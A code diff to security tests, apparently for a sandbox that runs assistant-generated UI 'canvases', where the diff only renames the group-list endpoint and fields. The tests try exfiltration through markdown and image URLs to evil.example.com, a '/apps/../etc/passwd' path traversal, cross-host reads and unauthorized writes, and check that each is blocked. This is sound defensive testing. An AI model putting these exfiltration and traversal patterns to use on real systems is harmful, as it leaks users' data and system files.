@@ -3735,8 +3735,8 @@ mod assist {
         let program = "root = Stack([CardHeader(\"Groups and the gate type\"), note, table, FormControl(\"Description\", Input(\"description\", $description)), saveButton])\n\
             note = MarkDownRenderer(\"See ![the tracker](https://evil.example.com/p.png?d=x) and [a site](https://evil.example.com/?d=x).\")\n\
             $description = \"\"\n\
-            groups = Query(\"request\", {path: \"/apps/system/Security/UserGroup/UserGroupList\", query: {userGroupId: \"ADMIN\"}}, {rows: []})\n\
-            table = Table([Col(\"Group\", groups.rows.userGroupId), Col(\"Description\", groups.rows.description)])\n\
+            groups = Query(\"request\", {path: \"/apps/system/Access/Groups\", query: {text: \"Administrators (full access)\"}}, {rows: []})\n\
+            table = Table([Col(\"Group\", groups.rows.userGroupIdText), Col(\"Description\", groups.rows.userGroupId)])\n\
             save = Mutation(\"request\", {method: \"POST\", path: \"/apps/assistgate/Edit/updateEnumType\", body: {enumTypeId: \"AST_GATE\", description: $description}})\n\
             saveButton = Button(\"Save\", Action([@Run(save)]))";
         fake::script(
@@ -3993,7 +3993,7 @@ module.exports = {
     settle('imageOther', function (done) { var i = new W.Image(); i.onload = function () { done('ALLOWED'); }; i.onerror = function () { done('blocked'); }; i.src = 'https://evil.example.com/p.png?d=x'; });
     settle('imageSite', function (done) { var i = new W.Image(); i.onload = function () { done('ALLOWED'); }; i.onerror = function () { done('blocked'); }; i.src = '/favicon.ico?d=x'; });
     settle('form', function (done) { var f = D.createElement('form'); f.method = 'POST'; f.action = '/apps/assistgate/Edit/updateEnumType'; D.body.appendChild(f); try { f.submit(); } catch (e) { } setTimeout(function () { done('blocked'); }, 600); });
-    settle('readList', function (done) { vm.$bridge.get('/apps/system/Security/UserGroup/UserGroupList', { userGroupId: 'ADMIN' }).then(function (r) { done('rows ' + (r.rows || []).map(function (row) { return row.userGroupId; }).join(',')); }, function (e) { done('ERR ' + e.message); }); });
+    settle('readList', function (done) { vm.$bridge.get('/apps/system/Access/Groups', { text: 'Administrators (full access)' }).then(function (r) { done('rows ' + (r.rows || []).map(function (row) { return row.userGroupIdText; }).join(',')); }, function (e) { done('ERR ' + e.message); }); });
     settle('readWrite', function (done) { vm.$bridge.get('/apps/assistgate/Edit/updateEnumType', { enumTypeId: 'AST_GATE', description: 'Read write' }).then(function () { done('ALLOWED'); }, function (e) { done('refused: ' + e.message); }); });
     settle('readDots', function (done) { vm.$bridge.get('/apps/../etc/passwd').then(function () { done('ALLOWED'); }, function (e) { done('refused: ' + e.message); }); });
     settle('readHost', function (done) { vm.$bridge.get('https://evil.example.com/x').then(function () { done('ALLOWED'); }, function (e) { done('refused: ' + e.message); }); });
@@ -4014,7 +4014,7 @@ module.exports = {
 </actions>
 
 <reads>
-["/apps/system/Security/UserGroup/UserGroupList"]
+["/apps/system/Access/Groups"]
 </reads>"#;
 
     /// A canvas that navigates its own frame to send what it read in a URL, past the server's checks (a computed name).
